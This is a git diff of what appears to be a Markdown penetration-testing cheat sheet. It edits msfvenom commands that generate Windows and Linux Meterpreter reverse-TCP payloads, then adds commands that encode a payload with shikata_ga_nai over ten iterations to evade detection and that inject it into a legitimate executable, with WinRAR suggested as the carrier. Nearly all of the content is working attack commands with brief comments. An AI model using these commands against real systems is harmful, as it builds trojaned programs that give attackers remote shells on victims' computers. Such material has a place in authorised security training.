@@ -404,16 +404,17 @@ msfvenom --list formats
 ```
 > this is use to show the formats of payload
 
-***Window payload***
+- Window payload
+  
 ```shell
-msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<my-ip> LPORT= 1234 -f exe > payload.exe
+msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<my-ip> LPORT=1234 -f exe > payload.exe
 ```
 > msfvenom payload. `x86` for 32 bit and `x64` is for 64 bit
 
-***Linux payload***
+- Linux payload
 
 ```shell
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<my-ip> LPORT= 1234 -f elf > payload
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<my-ip> LPORT=1234 -f elf > payload
 chmod +x payload
 ```
 
@@ -430,6 +431,23 @@ set LPORT 1234
 run
 ```
 > After deliver payload
+
+***payload encoding***
+```shell
+msfvenom --list encoders
+```
+> show the list of encoding
+
+```shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my-ip> LPORT=1234 -e x86/shikata_ga_nai -f exe > payload.exe
+```
+> add `-i 10` before -e mean that we encode the payload 10 time mean 10 iteration
+
+***inject payload in executable file***
+```shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my-ip> LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -x <path of file that you want to inject>.exe > payload.exe
+```
+> best if winRar `https://www.win-rar.com/predownload.html?&L=0&Version=32bit` to inject the payload in this
 
 #### hide payload in window
 ```shell
